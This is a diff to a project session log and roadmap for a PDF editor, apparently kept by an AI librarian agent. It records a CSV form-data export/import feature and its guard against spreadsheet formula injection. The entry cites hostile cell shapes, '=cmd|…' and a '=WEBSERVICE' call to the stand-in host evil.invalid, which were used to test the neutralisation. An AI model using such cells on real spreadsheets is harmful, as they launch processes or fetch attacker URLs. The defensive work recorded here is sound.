@@ -81,6 +81,154 @@ start of every session. Maintained by `pdfce-librarian`, dispatched by
 
 ## Shipped
 
+### ★ `a64b5fd` + `23eee9b` — form data as CSV, and the cell that is not inert: a spreadsheet cell is a second route to the network R12 already refuses — 2026-08-11 (ninetieth filing)
+
+**Sourcing.** No shell tool this dispatch (hard rule 8) — `git log -1
+--format=%B` not run for either hash. The engineer's dispatch text
+carried both commits' full description, the mechanism, and the
+verification/gate figures below; recorded as reported, not
+independently re-derived from source. **Grepped first:** `CSV`,
+`formcsv`, `export-data`, `import-data` against this file and
+`docs/FEATURES.md` — the only prior hits are FDF/XFDF's own history,
+confirming form-data CSV interchange is genuinely new scope, not a
+restatement of something already filed.
+
+**What shipped.** New `crates/pdfce-core/src/formcsv.rs` (11 tests) —
+two-column `name,value` RFC 4180 CSV, export and import, routed
+through `pdfce-cli export-data --format csv` / `import-data`
+(`a64b5fd`), and through the GUI's existing Export data / Import data
+buttons (`23eee9b`). Core + CLI + GUI, one session.
+
+**★ The part worth the most care in this record: a CSV cell is not
+inert, and pdfce authored a second route to the network R12 already
+refuses.** A spreadsheet application reads a cell beginning `=`, `+`,
+`-` or `@` as a FORMULA, not text. A form value comes out of a PDF
+pdfce did not write and cannot vouch for — so a field holding `=1+1`
+becomes live arithmetic the moment the CSV is opened, and the
+well-known hostile shapes reach past the spreadsheet entirely: `=cmd|…`
+launches a process, `=WEBSERVICE(…)` fetches a URL. **R12 — no network
+client in pdfce's own tree — is why the second of those matters more
+than the first.** Writing a cell that hands a URL fetch to the
+SPREADSHEET on the operator's behalf is the same capability by a
+longer route, with pdfce as the thing that put the trigger in the
+file. A no-network rule that only covers pdfce's own sockets is not a
+no-network rule.
+
+Values are neutralised with a leading apostrophe on export, and every
+neutralisation is COUNTED AND NAMED, not merely counted (R181's shape,
+applied to a new surface). Three properties, each independently
+tested: the source PDF is unchanged (neutralising is a property of
+the CSV, never the document); the change is disclosed, not silent;
+and it is REVERSIBLE on import, so a round trip through a spreadsheet
+does not accumulate apostrophes. Verified end to end: a field set to
+`=WEBSERVICE("http://evil.invalid")` exports prefixed, the disclosure
+names the field, and re-importing restores the exact original value.
+
+**`-` is included even though a negative number is the commonest
+reason a value starts with one — deliberately conservative, and
+disclosed rather than silently applied for exactly that reason.**
+Excel resolves `-5` as a number and `-cmd|…` as a formula, and the
+first character alone does not distinguish them; refusing to export
+such fields instead would be the wrong trade — an operator would lose
+a legitimate export over one unlucky character.
+
+**Other decisions filed this session, load-bearing for the shape:**
+
+- **Two columns (`name,value`), not one column per field.** The wide,
+  one-row-per-document shape is right for filling MANY copies of one
+  form from a spreadsheet — a genuinely different feature with a
+  different unit of work (a batch across documents, not one
+  document's own fields). Building the wide shape here would have made
+  this half of an unbuilt batch feature rather than a peer of FDF/
+  XFDF's own tall shape. **The wide/batch shape is UNSCOPED and filed
+  to *Backlog*, below — not built.**
+- **A row with the wrong column count on import is an ERROR**, not a
+  best-effort read. A spreadsheet that silently lost its value column
+  would otherwise import as field names with empty values and blank
+  the whole form — destructive, from a file that merely looked wrong.
+  An empty import file refuses for the same reason.
+- **Format detection is by CONTENT, not file extension, in both
+  shells — the try-order is deliberate, not arbitrary.** FDF is
+  recognised by its `%` header, XFDF by its opening `<`; CSV is the
+  residue, tried last, because it carries no marker of its own.
+- Excel's UTF-8 BOM is stripped rather than becoming part of the
+  first field's name; a blank trailing line is not counted as a row.
+
+**A process finding worth recording as its own note, from `23eee9b`.**
+`check-ui-strings.sh` flagged `", "` — the separator joining field
+names inside a multi-field disclosure sentence — as an operator-visible
+literal sitting outside the string catalog. First instinct: a comma is
+punctuation, not copy, and an exemption comment would be the honest
+fix. **The gate was right, and that instinct was wrong.** The separator
+joins names INSIDE a sentence, so anyone rewording that sentence must
+change the separator with it — and an exemption would have put the two
+in different files, where they drift apart silently. The value here
+was not catching a careless slip; it was overruling a judgement made
+deliberately and that would have been defended if not caught. Not
+written to `D:\dev\rag\rust\`/`egui\` — this is pdfce's own
+project-local gate script, not a Rust/egui-ecosystem finding.
+
+**A recurring debt, flagged rather than fixed, per the engineer's own
+framing — NOT filed as an R151 instance.** This is the THIRD
+consecutive time a capability landed in `pdfce-core` and `pdfce-cli`
+while the GUI kept its prior surface, closed in a same-day follow-up
+commit rather than the same one (`a64b5fd` → `23eee9b`, both
+2026-08-11). R151's own shape is a capability with NO caller for
+Pass-numbers or days at a time; here the GUI wiring landed the same
+session, one commit later — distinct enough not to force the citation,
+similar enough that a fourth instance may earn one. Left as a named
+observation, per the engineer's own explicit request that this be the
+librarian's call rather than a unilateral fix.
+
+**Verified at `23eee9b`, measured by the engineer.** Full workspace
+`cargo test`: **81 suites, 3255 passed, 0 failed**. `cargo clippy
+--workspace --all-targets --all-features`: **0**. `cargo fmt --check`,
+`check-ui-strings.sh`, `check-theme-colors.sh`: clean. **All four
+filing gates clean** — `check-commits-filed.py` clean across 252
+commits, `check-passes-filed.py`/`check-ledger-numbers.py`/
+`check-one-commit-per-command.py` all clean. **None independently
+re-run this dispatch — no shell tool (hard rule 8); relayed as
+measured by the engineer, not this librarian.**
+
+**Ledger for this filing.** **New Pass ID minted: `Pass 62.0`**
+(form-data CSV interchange — a third format for the existing
+"import/export form data" capability, but carrying its own security
+design and its own operator-facing shape decision, matching the
+`Pass 37.3` precedent for rich-text over folding silently into
+`Pass 7.1`; grepped free for "Pass 62" before minting per R156 — zero
+prior hits). Pass-family ceiling moves **61.0 → 62.0**, next free
+**63**. Two commits cited by hash (`a64b5fd`, `23eee9b`).
+`docs/FEATURES.md`: one new *Implemented* row under *Forms (AcroForm)*
+(form-data CSV export/import — `core [x]` / `cli [x]` / `gui [x]`,
+`Acrobat ?`, not looked up against `Acrobat_Features`); one new
+*Planned* row (the wide/batch CSV shape, UNSCOPED, no Pass ID).
+`docs/ARCHITECTURE.md`: **two new §12 entries, dated 2026-08-11** — the
+CSV-formula-injection neutralisation design (R12 cross-reference, the
+count-and-NAME + three-property-test discipline) and the tall-vs-wide
+shape decision (why two columns; why the wide shape is a distinct,
+unbuilt feature). `docs/ROADMAP.md` *Backlog*: one new entry, the
+wide/batch CSV shape. **Standing rules: no new mint.** R12, R151,
+R156, R181 all cited, none minted. Decision-record ceiling unchanged
+at **038**, next free **039** — neither §12 entry is a numbered
+`docs/decisions/` record. **No `D:\dev\rag\rust\`/`egui\` finding** —
+the `check-ui-strings.sh` process note is project-local tooling, not a
+Rust/egui-ecosystem finding. **`C:\personal_rag\pdf\`: ONE new
+lesson** — "form values exported to CSV are attacker-controlled
+formula input," an empirical interchange hazard rather than a spec
+fact, generalising to any tool exporting PDF form data to a
+spreadsheet format; that subject's own `index.md` and the master
+`C:\personal_rag\index.md` both updated this filing. Operator-question
+ceiling unchanged at **(bi)**, next free **(bj)**. Gate figures
+relayed per the engineer's own report, measured at `23eee9b` — **not
+independently re-run, no shell this dispatch** (hard rule 8).
+**Backup/git working-tree state not asserted anywhere in this
+filing** — the engineer should check `D:\Dev\pdfce-backups\` and `git
+log`/`git status` directly. This is the **ninetieth**
+`SESSION_LOG.md`/`ROADMAP.md` joint filing (the eighty-ninth confirmed
+present by direct read before this entry was written).
+
+---
+
 ### ★★ `5039ecf` + `ce5642d` — TWO GUARDS FAIL OPEN, found back to back: an unencrypted §7.6.7 wrapper presents its cover sheet as the document, and a hybrid-XFA fill goes stale on the half `fill_guards` never checked; `R186` MINTED — 2026-08-11 (eighty-ninth filing)
 
 **Sourcing.** No shell tool this dispatch (hard rule 8) — `git log`/`git
@@ -42400,6 +42548,19 @@ not a judgment call:**
   into "text-handling" (priority #3) without a further, explicit
   operator answer naming it specifically. **Re-surfaced, not resolved,
   by decision 019 — see item (j) above.**
+- **Wide/batch form-data CSV — one row per DOCUMENT, one column per
+  FIELD, for filling many copies of one form from a spreadsheet**
+  (named, deliberately not built, `Pass 62.0`, 2026-08-11). Distinct
+  from `Pass 62.0`'s own tall (`name,value`) CSV shape, which is a
+  peer of FDF/XFDF and answers "what are this ONE document's field
+  values" — the wide shape answers a different question, "fill N
+  copies of this SAME form from N rows of one spreadsheet," and is a
+  batch-across-documents unit of work, not a per-document one. Folding
+  it into `Pass 62.0` would have made that Pass half of an unbuilt
+  batch feature rather than a complete peer of FDF/XFDF. UNSCOPED, no
+  acceptance criteria written yet — needs its own Pass when the
+  operator asks for it, likely alongside or reusing pdfce's existing
+  Batch Tools surface.
 
 ## Standing rules
 
